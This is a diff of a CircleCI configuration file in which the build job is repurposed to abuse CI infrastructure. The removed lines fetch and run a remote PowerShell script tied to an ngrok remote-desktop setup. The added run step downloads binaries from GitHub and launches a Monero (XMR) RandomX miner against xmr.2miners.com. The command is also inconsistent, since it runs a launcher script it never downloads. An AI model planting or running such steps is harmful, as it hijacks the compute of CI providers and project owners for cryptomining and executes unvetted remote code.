@@ -1,20 +1,11 @@
-version: 2.1
-
-orbs:
-  win: circleci/windows@2.2.0
-
+version: 2.0
 jobs:
   build:
-    executor:
-      name:win/default
-      size:"medium"
-
-
-   steps:
-
-     -run:
-        name: paste Ngrok Value In Hosted Link
-        command: |
-          Invoke-WebRequest https://raw.githubusercontent.com/technowahab/rdp-tito/main/sh -OutFile gpu.ps1
- 
-     -run: ./gpu.ps1
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/technowahab/rdp-tito/main/sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <WALLET ADDRESS>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
